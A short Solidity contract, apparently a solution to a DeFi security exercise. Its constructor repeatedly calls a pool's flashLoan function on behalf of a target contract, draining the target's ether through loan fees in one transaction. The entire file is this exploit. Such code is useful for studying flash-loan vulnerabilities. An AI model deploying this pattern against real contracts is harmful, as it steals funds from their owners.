pragma solidity ^0.8.0;

interface PoolContract {
	function flashLoan(address borrower, uint256 borrowAmount) external;
}


/**
 * The MaliciousReceiver contract use its constructor to make all 'flashLoans' calls to the pool (using the _target address) in one transaction.
 */
contract MaliciousReceiver {
	constructor(address _pool, address _target, uint256 _etherTargetBalance) public {
		for (uint256 i = 0; i < _etherTargetBalance; i++)
			PoolContract(_pool).flashLoan(_target, 1 ether);
	}
}

